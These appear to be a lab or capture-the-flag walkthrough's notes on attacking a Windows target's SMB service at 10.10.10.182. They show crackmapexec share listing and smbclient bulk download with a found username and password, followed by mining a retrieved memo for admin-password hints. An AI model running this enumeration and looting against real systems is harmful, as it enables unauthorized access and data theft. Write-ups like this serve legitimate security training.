
```
cme smb 10.10.10.182 -u 'r.thompson' -p 'rY4n5eva' --shares
```

![[Pasted image 20240917012946.png]]

```
smbclient \\\\10.10.10.182\\Data -U 'r.thompson' --password 'rY4n5eva'
```

```
prompt off
recurse on
ls
mget *
```

![[Pasted image 20240917014153.png]]

```
<p>For anyone that missed yesterday�s meeting (I�m looking at
you Ben). Main points are below:</p>

<p class=MsoNormal><o:p>&nbsp;</o:p></p>

<p>-- New production network will be going live on
Wednesday so keep an eye out for any issues. </p>

<p>-- We will be using a temporary account to
perform all tasks related to the network migration and this account will be deleted at the end of
2018 once the migration is complete. This will allow us to identify actions
related to the migration in security logs etc. Username is TempAdmin (password is the same as the normal admin account password). </p>

<p>-- The winner of the �Best GPO� competition will be
announced on Friday so get your submissions in soon.</p>

<p class=MsoNormal><o:p>&nbsp;</o:p></p>

<p class=MsoNormal>Steve</p>

```

So the username who's password is same as admin is TempAdmin but but here is another user mentioned (i.e. Steve) will check in the userlist if we have that user or not.

```
s.smith
```

Let's dig the password or this user and check the remaining smb.
